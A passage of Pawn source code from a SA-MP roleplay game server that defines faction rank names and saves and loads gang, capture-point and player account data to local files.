	format(FacInfo[2][fRank3], 32, "Council");
	format(FacInfo[2][fRank4], 32, "Minister of Treasury");
	format(FacInfo[2][fRank5], 32, "Chief of Security");
	format(FacInfo[2][fRank6], 32, "Vice-President");
	format(FacInfo[2][fRank7], 32, "President");
	TaxPercent = dini_Int(file, "TaxPercent");
	TaxMoney = dini_Int(file, "TaxVault");
	print("Government files loaded successfully.");
	// Hitman Agency
	format(file, sizeof(file), "factions/HA.ini");
	format(FacInfo[3][fRank1], 32, "Intern");
	format(FacInfo[3][fRank2], 32, "Agent");
	format(FacInfo[3][fRank3], 32, "Senior Agent");
	format(FacInfo[3][fRank4], 32, "Special Agent ");
	format(FacInfo[3][fRank5], 32, "Supervisory Agent");
	format(FacInfo[3][fRank6], 32, "Assistant Director");
	format(FacInfo[3][fRank7], 32, "Director");
	print("Hitman Agency files loaded successfully.");
	// News Agency
	format(file, sizeof(file), "factions/NA.ini");
	format(FacInfo[5][facLeader], MAX_PLAYER_NAME, "%s", dini_Get(file, "NewsLeader"));
    format(FacInfo[4][fRank1], 32, "Intern");
	format(FacInfo[4][fRank2], 32, "Journalist");
	format(FacInfo[4][fRank3], 32, "Reporter");
	format(FacInfo[4][fRank4], 32, "Anchor");
	format(FacInfo[4][fRank5], 32, "Network Anchor");
	format(FacInfo[4][fRank6], 32, "Deputy Director");
	format(FacInfo[4][fRank7], 32, "Executive Director");
	NewsMoney = dini_Int(file, "Vault");
	print("News Agency files loaded successfully.");
	// LSFMD
	format(file, sizeof(file), "factions/LSFMD.ini");
	format(FacInfo[5][facLeader], MAX_PLAYER_NAME, "%s", dini_Get(file, "LSFMDLeader"));
	format(FacInfo[5][fRank1], 32, "Private");
	format(FacInfo[5][fRank2], 32, "Probationary Firefighter");
	format(FacInfo[5][fRank3], 32, "Corporal");
	format(FacInfo[5][fRank4], 32, "Firefighter");
	format(FacInfo[5][fRank5], 32, "Sergeant");
	format(FacInfo[5][fRank6], 32, "Senior Firefighter");
	format(FacInfo[5][fRank7], 32, "Staff Sergeant");
	format(FacInfo[5][fRank8], 32, "Station Firefighter");
	format(FacInfo[5][fRank9], 32, "Warrant Officer");
	format(FacInfo[5][fRank10], 32, "Lieutenant");
	format(FacInfo[5][fRank11], 32, "Senior Warrant Officer");
	format(FacInfo[5][fRank12], 32, "Captain");
	format(FacInfo[5][fRank13], 32, "Battalion Chief");
	format(FacInfo[5][fRank14], 32, "District Chief");
	format(FacInfo[5][fRank15], 32, "Deputy Chief");
	format(FacInfo[5][fRank16], 32, "Chief Of Department");
	print("LSFMD files loaded successfully.");
	// FBI
	format(file, sizeof(file), "factions/FBI.ini");
	format(FacInfo[6][facLeader], MAX_PLAYER_NAME, "%s", dini_Get(file, "FBILeader"));
	format(FacInfo[6][fRank1], 32, "Probationary Agent");
	format(FacInfo[6][fRank2], 32, "Agent");
	format(FacInfo[6][fRank3], 32, "Senior Agent");
	format(FacInfo[6][fRank4], 32, "Supervisory Agent ");
	format(FacInfo[6][fRank5], 32, "Assistant Special AIC");
	format(FacInfo[6][fRank6], 32, "Special AIC");
	format(FacInfo[6][fRank7], 32, "Executive Director");
	format(FacInfo[6][fRank8], 32, "Deputy COS");
	format(FacInfo[6][fRank9], 32, "Chief of Staff ");
	format(FacInfo[6][fRank10], 32, "Deputy Director");
	format(FacInfo[6][fRank11], 32, "Director");
	format(FacInfo[6][fDiv1], 8, "OCTB");
	format(FacInfo[6][fDiv2], 8, "FANB");
	format(FacInfo[6][fDiv3], 8, "FO");
	format(FacInfo[6][fDiv4], 8, "WPU");
	format(FacInfo[6][fDiv5], 8, "IU");
	format(FacInfo[6][fDiv6], 8, "IA");
	print("FBI files loaded successfully.");
    // DOC
	format(file, sizeof(file), "factions/DOC.ini");
	format(FacInfo[7][facLeader], MAX_PLAYER_NAME, "%s", dini_Get(file, "DOCLeader"));
	format(FacInfo[7][fRank1], 32, "Trainee");
	format(FacInfo[7][fRank2], 32, "Correction Officer");
	format(FacInfo[7][fRank3], 32, "Senior Officer");
	format(FacInfo[7][fRank4], 32, "Sergeant");
	format(FacInfo[7][fRank5], 32, "Staff Sergeant");
	format(FacInfo[7][fRank6], 32, "Chief Warden");
	format(FacInfo[7][fRank7], 32, "Senior Chief Warden");
	format(FacInfo[7][fRank8], 32, "Rehabilitation Officer");
	format(FacInfo[7][fRank9], 32, "Assistant Superintendent");
	format(FacInfo[7][fRank10], 32, "Superintendent");
	format(FacInfo[7][fRank11], 32, "Deputy Director");
	format(FacInfo[7][fRank12], 32, "Director");
	print("DOC files loaded successfully.");
	return 1;
}

// Families
enum famInfo
{
	fTaken,
	fName[32],
	fMOTD[64],
	fColor,
	fLeader[MAX_PLAYER_NAME],
	fLevel,
	fMembers,
	Float:fSafeX,
	Float:fSafeY,
	Float:fSafeZ,
	fMoney,
	fMats,
	fWeed,
	fSeeds,
	fcocaine,
	fRank1[32],
	fRank2[32],
	fRank3[32],
	fRank4[32],
	fRank5[32],
	fRank6[32],
	fSkins[7],
	fStrikes,
	Text3D:fText,
	fPickup,
	fVeh[5],
	fVehType[5],
	Float:fVehCoX[5],
	Float:fVehCoY[5],
	Float:fVehCoZ[5],
	fVehCol1[5],
	fVehCol2[5],
	Float:fVehRot[5],
	fCookies,
	Float:fHQX,
	Float:fHQY,
	Float:fHQZ,
	Text3D:fHQText,
	fHQPickup,
	fVW,
	fPissAchievment,
	fHQAchievment,
	fSafeAchievment,
	fPointAchievment
}
new FamInfo[MAX_FAMILIES][famInfo];


stock SaveFamilies()
{
	new idx = 1, File:file;
	new string[1300];
	while(idx < MAX_FAMILIES)
	{
	    format(string, sizeof(string), "%d|%s|%s|%d|%s|%d|%d|%f|%f|%f|%d|%d|%d|%d|%s|%s|%s|%s|%s|%s|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%f|%f|%f|%f|%f|%f|%f|%f|%f|%f|%f|%f|%f|%f|%f|%f|%f|%f|%f|%f|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%f|%f|%f|%d|%d|%d|%d|%d\r\n",
		FamInfo[idx][fTaken],
		FamInfo[idx][fName],
		FamInfo[idx][fMOTD],
		FamInfo[idx][fColor],
		FamInfo[idx][fLeader],
		FamInfo[idx][fLevel],
		FamInfo[idx][fMembers],
		FamInfo[idx][fSafeX],
		FamInfo[idx][fSafeY],
		FamInfo[idx][fSafeZ],
		FamInfo[idx][fMoney],
		FamInfo[idx][fMats],
		FamInfo[idx][fWeed],
		FamInfo[idx][fcocaine],
		FamInfo[idx][fRank1],
		FamInfo[idx][fRank2],
		FamInfo[idx][fRank3],
		FamInfo[idx][fRank4],
		FamInfo[idx][fRank5],
		FamInfo[idx][fRank6],
		FamInfo[idx][fSkins][0],
		FamInfo[idx][fSkins][1],
		FamInfo[idx][fSkins][2],
		FamInfo[idx][fSkins][3],
		FamInfo[idx][fSkins][4],
		FamInfo[idx][fSkins][5],
		FamInfo[idx][fSkins][6],
		FamInfo[idx][fStrikes],
		FamInfo[idx][fVehType][0], // Veh 1
		FamInfo[idx][fVehType][1], // Veh 2
		FamInfo[idx][fVehType][2], // Veh 3
		FamInfo[idx][fVehType][3], // Veh 4
		FamInfo[idx][fVehType][4], // Veh 5
		FamInfo[idx][fVehCoX][0], // Veh 1 Coords
		FamInfo[idx][fVehCoY][0],
		FamInfo[idx][fVehCoZ][0],
		FamInfo[idx][fVehCoX][1], // Veh 2 Coords
		FamInfo[idx][fVehCoY][1],
		FamInfo[idx][fVehCoZ][1],
		FamInfo[idx][fVehCoX][2], // Veh 3 Coords
		FamInfo[idx][fVehCoY][2],
		FamInfo[idx][fVehCoZ][2],
		FamInfo[idx][fVehCoX][3], // Veh 4 Coords
		FamInfo[idx][fVehCoY][3],
		FamInfo[idx][fVehCoZ][3],
		FamInfo[idx][fVehCoX][4], // Veh 5 Coords
		FamInfo[idx][fVehCoY][4],
		FamInfo[idx][fVehCoZ][4],
		FamInfo[idx][fVehRot][0],
		FamInfo[idx][fVehRot][1],
		FamInfo[idx][fVehRot][2],
		FamInfo[idx][fVehRot][3],
		FamInfo[idx][fVehRot][4],
		FamInfo[idx][fVehCol1][0],
		FamInfo[idx][fVehCol1][1],
		FamInfo[idx][fVehCol1][2],
		FamInfo[idx][fVehCol1][3],
		FamInfo[idx][fVehCol1][4],
		FamInfo[idx][fVehCol2][0],
		FamInfo[idx][fVehCol2][1],
		FamInfo[idx][fVehCol2][2],
		FamInfo[idx][fVehCol2][3],
		FamInfo[idx][fVehCol2][4],
		FamInfo[idx][fCookies],
		FamInfo[idx][fHQX],
		FamInfo[idx][fHQY],
		FamInfo[idx][fHQZ],
		FamInfo[idx][fVW],
		FamInfo[idx][fPissAchievment],
		FamInfo[idx][fHQAchievment],
		FamInfo[idx][fSafeAchievment],
		FamInfo[idx][fPointAchievment]);
	    if(idx == 1)
	    {
	        file = fopen("families.cfg", io_write);
	    }
	    else
	    {
	    	file = fopen("families.cfg", io_append);
	    }
		fwrite(file, string);
		fclose(file);
		idx++;
	}
	print("Families saved successfully.");
}

stock LoadFamilies()
{
	new finfo[72][48];
	new string[512];
	new File:file = fopen("families.cfg", io_read);
	if(file)
	{
	    new idx = 1;
		while(idx < MAX_FAMILIES)
		{
		    fread(file, string);
		    split(string, finfo, '|');
			FamInfo[idx][fTaken] = strval(finfo[0]);
			format(FamInfo[idx][fName], 32, "%s", finfo[1]);
			format(FamInfo[idx][fMOTD], 64, "%s", finfo[2]);
			FamInfo[idx][fColor] = strval(finfo[3]);
			format(FamInfo[idx][fLeader], MAX_PLAYER_NAME, "%s", finfo[4]);
			FamInfo[idx][fLevel] = strval(finfo[5]);
			if(FamInfo[idx][fLevel] == 0) FamInfo[idx][fLevel] = 1;
			FamInfo[idx][fMembers] = strval(finfo[6]);
			FamInfo[idx][fSafeX] = floatstr(finfo[7]);
			FamInfo[idx][fSafeY] = floatstr(finfo[8]);
			FamInfo[idx][fSafeZ] = floatstr(finfo[9]);
			FamInfo[idx][fMoney] = strval(finfo[10]);
			FamInfo[idx][fMats] = strval(finfo[11]);
			FamInfo[idx][fWeed] = strval(finfo[12]);
			FamInfo[idx][fcocaine] = strval(finfo[13]);
			format(FamInfo[idx][fRank1], 32, "%s", finfo[14]);
			format(FamInfo[idx][fRank2], 32, "%s", finfo[15]);
			format(FamInfo[idx][fRank3], 32, "%s", finfo[16]);
			format(FamInfo[idx][fRank4], 32, "%s", finfo[17]);
			format(FamInfo[idx][fRank5], 32, "%s", finfo[18]);
			format(FamInfo[idx][fRank6], 32, "%s", finfo[19]);
			FamInfo[idx][fSkins][0] = strval(finfo[20]);
			FamInfo[idx][fSkins][1] = strval(finfo[21]);
			FamInfo[idx][fSkins][2] = strval(finfo[22]);
			FamInfo[idx][fSkins][3] = strval(finfo[23]);
			FamInfo[idx][fSkins][4] = strval(finfo[24]);
			FamInfo[idx][fSkins][5] = strval(finfo[25]);
			FamInfo[idx][fSkins][6] = strval(finfo[26]);
			FamInfo[idx][fStrikes] = strval(finfo[27]);
			FamInfo[idx][fVehType][0] = strval(finfo[28]);
			FamInfo[idx][fVehType][1] = strval(finfo[29]);
			FamInfo[idx][fVehType][2] = strval(finfo[30]);
			FamInfo[idx][fVehType][3] = strval(finfo[31]);
			FamInfo[idx][fVehType][4] = strval(finfo[32]);
			FamInfo[idx][fVehCoX][0] = floatstr(finfo[33]);
			FamInfo[idx][fVehCoY][0] = floatstr(finfo[34]);
			FamInfo[idx][fVehCoZ][0] = floatstr(finfo[35]);
			FamInfo[idx][fVehCoX][1] = floatstr(finfo[36]);
			FamInfo[idx][fVehCoY][1] = floatstr(finfo[37]);
			FamInfo[idx][fVehCoZ][1] = floatstr(finfo[38]);
			FamInfo[idx][fVehCoX][2] = floatstr(finfo[39]);
			FamInfo[idx][fVehCoY][2] = floatstr(finfo[40]);
			FamInfo[idx][fVehCoZ][2] = floatstr(finfo[41]);
			FamInfo[idx][fVehCoX][3] = floatstr(finfo[42]);
			FamInfo[idx][fVehCoY][3] = floatstr(finfo[43]);
			FamInfo[idx][fVehCoZ][3] = floatstr(finfo[44]);
			FamInfo[idx][fVehCoX][4] = floatstr(finfo[45]);
			FamInfo[idx][fVehCoY][4] = floatstr(finfo[46]);
			FamInfo[idx][fVehCoZ][4] = floatstr(finfo[47]);
			FamInfo[idx][fVehRot][0] = strval(finfo[48]); // Rot
			FamInfo[idx][fVehRot][1] = strval(finfo[49]);
			FamInfo[idx][fVehRot][2] = strval(finfo[50]);
			FamInfo[idx][fVehRot][3] = strval(finfo[51]);
			FamInfo[idx][fVehRot][4] = strval(finfo[52]);
			FamInfo[idx][fVehCol1][0] = strval(finfo[53]); // Colors
			FamInfo[idx][fVehCol1][1] = strval(finfo[54]);
			FamInfo[idx][fVehCol1][2] = strval(finfo[55]);
			FamInfo[idx][fVehCol1][3] = strval(finfo[56]);
			FamInfo[idx][fVehCol1][4] = strval(finfo[57]);
			FamInfo[idx][fVehCol2][0] = strval(finfo[58]);
			FamInfo[idx][fVehCol2][1] = strval(finfo[59]);
			FamInfo[idx][fVehCol2][2] = strval(finfo[60]);
			FamInfo[idx][fVehCol2][3] = strval(finfo[61]);
			FamInfo[idx][fVehCol2][4] = strval(finfo[62]);
			FamInfo[idx][fCookies] = strval(finfo[63]);
			FamInfo[idx][fHQX] = floatstr(finfo[64]);
			FamInfo[idx][fHQY] = floatstr(finfo[65]);
			FamInfo[idx][fHQZ] = floatstr(finfo[66]);
			FamInfo[idx][fVW] = strval(finfo[67]);
			FamInfo[idx][fPissAchievment] = strval(finfo[68]);
			FamInfo[idx][fHQAchievment] = strval(finfo[69]);
			FamInfo[idx][fSafeAchievment] = strval(finfo[70]);
			FamInfo[idx][fPointAchievment] = strval(finfo[71]);
			if(FamInfo[idx][fSafeX] != 0 && FamInfo[idx][fSafeY] != 0 && FamInfo[idx][fSafeZ] != 0)
			{
			    FamInfo[idx][fPickup] = CreateDynamicPickup(1239, 1, FamInfo[idx][fSafeX], FamInfo[idx][fSafeY], FamInfo[idx][fSafeZ], -1);
				format(string, sizeof(string), "%s's Safe", FamInfo[idx][fName]);
		    	FamInfo[idx][fText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, FamInfo[idx][fSafeX], FamInfo[idx][fSafeY], FamInfo[idx][fSafeZ]+0.5, 15);
			}
			if(FamInfo[idx][fHQX] != 0 && FamInfo[idx][fHQY] != 0 && FamInfo[idx][fHQZ] != 0)
			{
			    FamInfo[idx][fHQPickup] = CreateDynamicPickup(1239, 1, FamInfo[idx][fHQX], FamInfo[idx][fHQY], FamInfo[idx][fHQZ], -1);
				format(string, sizeof(string), "%s's Headquarter", FamInfo[idx][fName]);
		    	FamInfo[idx][fHQText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, FamInfo[idx][fHQX], FamInfo[idx][fHQY], FamInfo[idx][fHQZ]+0.5, 15);
			}
			for(new i=0; i<5; i++)
			{
			    if(FamInfo[idx][fVehType][i])
			    {
			        FamInfo[idx][fVeh][i] = CreateVehicle(FamInfo[idx][fVehType][i], FamInfo[idx][fVehCoX][i], FamInfo[idx][fVehCoY][i], FamInfo[idx][fVehCoZ][i], FamInfo[idx][fVehRot][i], FamInfo[idx][fVehCol1][i], FamInfo[idx][fVehCol2][i], 1200);
                   	ChangeVehicleColor(FamInfo[idx][fVeh][i], FamInfo[idx][fVehCol1][i], FamInfo[idx][fVehCol2][i]);
                   	Fam[FamInfo[idx][fVeh][i]] = idx;
			    }
			}
			idx++;
	    }
	}
	print("Families loaded successfully.");
	return 1;
}
// Drugs Depot - Drugs House - Crack Lab - Materials Pickup - Materials Factory
new PointTimer;
new Capturing;
new Float:Capture[3];
new PointBC[MAX_POINTS];

enum pointInfo
{
	pName[32],
	pTime,
	pOwner,
	Float:pX,
	Float:pY,
	Float:pZ,
	pProfit,
	pPickup,
	Text3D:pText
}
new PointInfo[MAX_POINTS][pointInfo];

stock SavePoints()
{
	new idx = 0, File:file;
	new string[256];
	while(idx < MAX_POINTS)
	{
	    format(string, sizeof(string), "%s|%d|%d|%f|%f|%f|%d\r\n",
		PointInfo[idx][pName],
		PointInfo[idx][pTime],
		PointInfo[idx][pOwner],
		PointInfo[idx][pX],
		PointInfo[idx][pY],
		PointInfo[idx][pZ],
		PointInfo[idx][pProfit]);
	    if(idx == 0)
	    {
	        file = fopen("points.cfg", io_write);
	    }
	    else
	    {
	    	file = fopen("points.cfg", io_append);
	    }
		fwrite(file, string);
		fclose(file);
		idx++;
	}
	print("Points saved successfully.");
}

stock LoadPoints()
{
	new dinfo[7][128];
	new string[256];
	new File:file = fopen("points.cfg", io_read);
	if(file)
	{
	    new idx = 0;
		while(idx < MAX_POINTS)
		{
		    fread(file, string);
		    split(string, dinfo, '|');
			format(PointInfo[idx][pName], 32, "%s", dinfo[0]);
			PointInfo[idx][pTime] = strval(dinfo[1]);
			PointInfo[idx][pOwner] = strval(dinfo[2]);
			PointInfo[idx][pX] = floatstr(dinfo[3]);
			PointInfo[idx][pY] = floatstr(dinfo[4]);
			PointInfo[idx][pZ] = floatstr(dinfo[5]);
			PointInfo[idx][pProfit] = strval(dinfo[6]);
			if(!PointInfo[idx][pTime]) // If point time is 0
			{
			    DestroyDynamicPickup(PointInfo[idx][pPickup]);
			    DestroyDynamic3DTextLabel(PointInfo[idx][pText]);
			    PointInfo[idx][pProfit] = 0;
			    PointInfo[idx][pPickup] = CreateDynamicPickup(1239, 1, PointInfo[idx][pX], PointInfo[idx][pY], PointInfo[idx][pZ]);
		    	PointInfo[idx][pText] = CreateDynamic3DTextLabel("Available Point\nUse {01A9DB}/capture", COLOR_WHITE, PointInfo[idx][pX], PointInfo[idx][pY], PointInfo[idx][pZ]+0.3, 15);
				format(string, sizeof(string), "The {01A9DB}%s {FF6347}is available to be captured.", PointInfo[idx][pName]);
			    SendClientMessageToAll(COLOR_LIGHTRED, string);
			}
			idx++;
	    }
	}
	print("Points loaded successfully.");
	return 1;
}
stock SaveChar(playerid)
{
	if(Logged(playerid))
	{
	    if(Player[playerid][pTutorial])
	    {
		    new file[64];
			format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(playerid));
			if(!dini_Exists(file)) dini_Create(file);
			if(!Event[playerid])
    		{
	    		Player[playerid][pInt] = GetPlayerInterior(playerid);
	    		Player[playerid][pVW] = GetPlayerVirtualWorld(playerid);
	    		GetPlayerPos(playerid, Player[playerid][pX], Player[playerid][pY], Player[playerid][pZ]);
	    		GetPlayerHealth(playerid, Player[playerid][pHealth]);
	    		GetPlayerArmour(playerid, Player[playerid][pArmor]);
    		}
    		if(Player[playerid][vModel])
			{
				GetVehiclePos(Player[playerid][pVeh],Player[playerid][vX], Player[playerid][vY], Player[playerid][vZ]);
				GetVehicleZAngle(Player[playerid][pVeh],Player[playerid][vA]);
			}
			if(Player[playerid][vVModel])
			{
				GetVehiclePos(Player[playerid][pVVeh],Player[playerid][vVX], Player[playerid][vVY], Player[playerid][vVZ]);
				GetVehicleZAngle(Player[playerid][pVVeh],Player[playerid][vVA]);
			}
			if(Player[playerid][vVVModel])
			{
				GetVehiclePos(Player[playerid][pVVVeh],Player[playerid][vVVX], Player[playerid][vVVY], Player[playerid][vVVZ]);
				GetVehicleZAngle(Player[playerid][pVVVeh],Player[playerid][vVVA]);
			}
			if(Player[playerid][vVVVModel])
			{
				GetVehiclePos(Player[playerid][pVVVVeh],Player[playerid][vVVVX], Player[playerid][vVVVY], Player[playerid][vVVVZ]);
				GetVehicleZAngle(Player[playerid][pVVVVeh],Player[playerid][vVVVA]);
			}
			if(Player[playerid][pLevel] == 0) Player[playerid][pLevel] = 1;
			Player[playerid][pModel] = GetPlayerSkin(playerid);
			SaveZamoraAmmo(playerid);
			// Save
			dini_Set(file, "IP", Player[playerid][pIP]);
			dini_IntSet(file, "Gender", Player[playerid][pGender]);
			dini_IntSet(file, "Level", Player[playerid][pLevel]);
			dini_IntSet(file, "Minutes", Player[playerid][pMinutes]);
			dini_IntSet(file, "Hours", Player[playerid][pHours]);
			dini_IntSet(file, "Exp", Player[playerid][pExp]);
			dini_IntSet(file, "Age", Player[playerid][pAge]);
			dini_IntSet(file, "Cash", Player[playerid][pMoney]);
			dini_IntSet(file, "Color", Player[playerid][pColor]);
			dini_IntSet(file, "Bank", Player[playerid][pBank]);
			dini_IntSet(file, "Model", Player[playerid][pModel]);
			dini_IntSet(file, "Admin", Player[playerid][pAdmin]);
			dini_IntSet(file, "AdminLocked", Player[playerid][pAdminLocked]);
			dini_IntSet(file, "GangMod", Player[playerid][pGangMod]);
			dini_IntSet(file, "FacMod", Player[playerid][pFacMod]);
			dini_IntSet(file, "pBanned", Player[playerid][pBanned]);
			dini_IntSet(file, "pEBanned", Player[playerid][pEBanned]);
			dini_FloatSet(file, "X", Player[playerid][pX]);
			dini_FloatSet(file, "Y", Player[playerid][pY]);
			dini_FloatSet(file, "Z", Player[playerid][pZ]);
			dini_IntSet(file, "Int", Player[playerid][pInt]);
			dini_IntSet(file, "VW", Player[playerid][pVW]);
			dini_IntSet(file, "Fac", Player[playerid][pFac]);
			dini_IntSet(file, "FacRank", Player[playerid][pFacRank]);
			dini_IntSet(file, "FacLeader", Player[playerid][pFacLeader]);
			dini_IntSet(file, "FacDiv", Player[playerid][pFacDiv]);
			dini_IntSet(file, "FacDivLeader", Player[playerid][pFacDivLeader]);
			dini_IntSet(file, "Duty", Player[playerid][pFacDuty]);
			dini_IntSet(file, "wSlot0", Player[playerid][pWeapon][0]);
			dini_IntSet(file, "wSlot0Ammo", Player[playerid][pWeaponAmmo][0]);
			dini_IntSet(file, "wSlot1", Player[playerid][pWeapon][1]);
			dini_IntSet(file, "wSlot1Ammo", Player[playerid][pWeaponAmmo][1]);
			dini_IntSet(file, "wSlot2", Player[playerid][pWeapon][2]);
			dini_IntSet(file, "wSlot2Ammo", Player[playerid][pWeaponAmmo][2]);
			dini_IntSet(file, "wSlot3", Player[playerid][pWeapon][3]);
			dini_IntSet(file, "wSlot3Ammo", Player[playerid][pWeaponAmmo][3]);
			dini_IntSet(file, "wSlot4", Player[playerid][pWeapon][4]);
			dini_IntSet(file, "wSlot4Ammo", Player[playerid][pWeaponAmmo][4]);
			dini_IntSet(file, "wSlot5", Player[playerid][pWeapon][5]);
	        dini_IntSet(file, "wSlot5Ammo", Player[playerid][pWeaponAmmo][5]);
			dini_IntSet(file, "wSlot6", Player[playerid][pWeapon][6]);
			dini_IntSet(file, "wSlot6Ammo", Player[playerid][pWeaponAmmo][6]);
			dini_IntSet(file, "wSlot7", Player[playerid][pWeapon][7]);
			dini_IntSet(file, "wSlot7Ammo", Player[playerid][pWeaponAmmo][7]);
			dini_IntSet(file, "wSlot8", Player[playerid][pWeapon][8]);
			dini_IntSet(file, "wSlot8Ammo", Player[playerid][pWeaponAmmo][8]);
			dini_IntSet(file, "wSlot9", Player[playerid][pWeapon][9]);
			dini_IntSet(file, "wSlot9Ammo", Player[playerid][pWeaponAmmo][9]);
			dini_IntSet(file, "wSlot10", Player[playerid][pWeapon][10]);
			dini_IntSet(file, "wSlot10Ammo", Player[playerid][pWeaponAmmo][10]);
			dini_IntSet(file, "wSlot11", Player[playerid][pWeapon][11]);
			dini_IntSet(file, "wSlot11Ammo", Player[playerid][pWeaponAmmo][11]);
			dini_IntSet(file, "wSlot12", Player[playerid][pWeapon][12]);
			dini_IntSet(file, "wSlot12Ammo", Player[playerid][pWeaponAmmo][12]);
			dini_IntSet(file, "Hospital", Player[playerid][pHospital]);
			dini_IntSet(file, "Dead", Player[playerid][pHospital]);
			dini_IntSet(file, "Business", Player[playerid][pBiz]);
			dini_IntSet(file, "VBusiness", Player[playerid][pVBiz]);
			dini_IntSet(file, "House", Player[playerid][pHouse]);
			dini_IntSet(file, "Garage", Player[playerid][pGarage]);
			dini_IntSet(file, "VGarage", Player[playerid][pVGarage]);
			dini_IntSet(file, "HouseOwner", Player[playerid][pSafeAdmin]);
			dini_IntSet(file, "vHouse", Player[playerid][pVHouse]);
			dini_IntSet(file, "BizOwner", Player[playerid][pOwner]);
			dini_IntSet(file, "Job", Player[playerid][pJob]);
			dini_IntSet(file, "Mechanic", Player[playerid][pJobSkill][JOB_MECHANIC]);
			dini_IntSet(file, "Lawyer", Player[playerid][pJobSkill][JOB_LAWYER]);
			dini_IntSet(file, "Trucker", Player[playerid][pJobSkill][JOB_TRUCKER]);
			dini_IntSet(file, "Fisher", Player[playerid][pJobSkill][JOB_FISHER]);
			dini_IntSet(file, "WDealer", Player[playerid][pJobSkill][JOB_WDEALER]);
			dini_IntSet(file, "WSmuggler", Player[playerid][pJobSkill][JOB_WSMUGGLER]);
			dini_IntSet(file, "DDealer", Player[playerid][pJobSkill][JOB_DDEALER]);
			dini_IntSet(file, "DSmuggler", Player[playerid][pJobSkill][JOB_DSMUGGLER]);
			dini_IntSet(file, "CarJacker", Player[playerid][pJobSkill][JOB_CARJACKER]);
			dini_IntSet(file, "Fisher", Player[playerid][pJobSkill][JOB_FISHER]);
			dini_IntSet(file, "TPackages", Player[playerid][pTPackages]);
			dini_IntSet(file, "LMPackages", Player[playerid][pLMPackages]);
			dini_IntSet(file, "MMPackages", Player[playerid][pMMPackages]);
			dini_IntSet(file, "HMPackages", Player[playerid][pHMPackages]);
			dini_IntSet(file, "LMaterials", Player[playerid][pLMaterials]);
			dini_IntSet(file, "MMaterials", Player[playerid][pMMaterials]);
			dini_IntSet(file, "HMaterials", Player[playerid][pHMaterials]);
			dini_IntSet(file, "Materials", Player[playerid][pMaterials]);
			dini_IntSet(file, "HasCellphone", Player[playerid][pHasCellphone]);
			dini_IntSet(file, "Boombox", Player[playerid][pBoombox]);
			dini_IntSet(file, "AUX Cord", Player[playerid][pAUXCord]);
			dini_IntSet(file, "MP3 Player", Player[playerid][pCDPlayer]);
			dini_IntSet(file, "Cellphone", Player[playerid][pPhone]);
			dini_IntSet(file, "Phonebook", Player[playerid][pPhonebook]);
			dini_IntSet(file, "Dice", Player[playerid][pDice]);
			dini_IntSet(file, "Cigar", Player[playerid][pCigar]);
			dini_IntSet(file, "Speedo", Player[playerid][pSpeedo]);
			dini_IntSet(file, "Sprunk", Player[playerid][pSprunk]);
			dini_IntSet(file, "Spray", Player[playerid][pSpray]);
			dini_IntSet(file, "Rope", Player[playerid][pRope]);
			dini_IntSet(file, "Blindfold", Player[playerid][pBlindfold]);
			dini_IntSet(file, "WT", Player[playerid][pWT]);
			dini_IntSet(file, "WTC", Player[playerid][pWTC]);
			dini_IntSet(file, "Gas", Player[playerid][pGas]);
			dini_IntSet(file, "Radio", Player[playerid][pRadio]);
			dini_FloatSet(file, "Health", Player[playerid][pHealth]);
			dini_FloatSet(file, "Armor", Player[playerid][pArmor]);
			dini_IntSet(file, "Internet", Player[playerid][pInternet]);
			dini_IntSet(file, "Song1", Player[playerid][pSong][1]);
			dini_IntSet(file, "Song2", Player[playerid][pSong][2]);
			dini_IntSet(file, "Jail", Player[playerid][pJail]);
			dini_IntSet(file, "JailTime", Player[playerid][pJailTime]);
			dini_Set(file, "JailReason", Player[playerid][pJailReason]);
			dini_Set(file, "JailBy", Player[playerid][pJailBy]);
			dini_IntSet(file, "Prison", Player[playerid][pPrison]);
			dini_IntSet(file, "PrisonTime", Player[playerid][pPrisonTime]);
			dini_Set(file, "PrisonReason", Player[playerid][pPrisonReason]);
			dini_Set(file, "PrisonBy", Player[playerid][pPrisonBy]);
			dini_IntSet(file, "Wanted", Player[playerid][pWanted]);
			dini_Set(file, "Wanted1", Player[playerid][pWanted1]);
			dini_Set(file, "Wanted2", Player[playerid][pWanted2]);
			dini_Set(file, "Wanted3", Player[playerid][pWanted3]);
			dini_Set(file, "Wanted4", Player[playerid][pWanted4]);
			dini_Set(file, "Wanted5", Player[playerid][pWanted5]);
			dini_Set(file, "Wanted6", Player[playerid][pWanted6]);
			dini_IntSet(file, "Crimes", Player[playerid][pCrimes]);
			dini_IntSet(file, "Arrested", Player[playerid][pArrested]);
			dini_IntSet(file, "DPackages", Player[playerid][pDPackages]);
			dini_IntSet(file, "Weed", Player[playerid][pWeed]);
			dini_IntSet(file, "Weed", Player[playerid][pWeed]);
 			dini_IntSet(file, "Seeds", Player[playerid][pSeeds]);
			dini_IntSet(file, "cocaine", Player[playerid][pCocaine]);
			dini_IntSet(file, "TrunkWeed", Player[playerid][pTWeed]);
			dini_IntSet(file, "TrunkCocaine", Player[playerid][pTCocaine]);
			dini_IntSet(file, "vTrunkWeed", Player[playerid][pvTWeed]);
 			dini_IntSet(file, "vTrunkSeeds", Player[playerid][pvTWSeeds]);
			dini_IntSet(file, "vTrunkCocaine", Player[playerid][pvTCocaine]);
			dini_IntSet(file, "vVTrunkWeed", Player[playerid][pvVTWeed]);
 			dini_IntSet(file, "vVTrunkSeeds", Player[playerid][pvVTWSeeds]);
			dini_IntSet(file, "vVTrunkCocaine", Player[playerid][pvVTCocaine]);
			dini_IntSet(file, "vVVTrunkWeed", Player[playerid][pvVVTWeed]);
			dini_IntSet(file, "vVVTrunkSeeds", Player[playerid][pvVVTWSeeds]);
			dini_IntSet(file, "vVVTrunkCocaine", Player[playerid][pvVVTCocaine]);
			dini_IntSet(file, "vLowTrunkMaterial", Player[playerid][pLTMaterials]);
			dini_IntSet(file, "vMediumTrunkMaterial", Player[playerid][pMTMaterials]);
			dini_IntSet(file, "vHighTrunkMaterial", Player[playerid][pHTMaterials]);
			dini_IntSet(file, "vVLowTrunkMaterial", Player[playerid][pvLTMaterials]);
			dini_IntSet(file, "vVMediumTrunkMaterial", Player[playerid][pvMTMaterials]);
			dini_IntSet(file, "vVHighTrunkMaterial", Player[playerid][pvHTMaterials]);
			dini_IntSet(file, "vVVLTrunkMaterial", Player[playerid][pvvLTMaterials]);
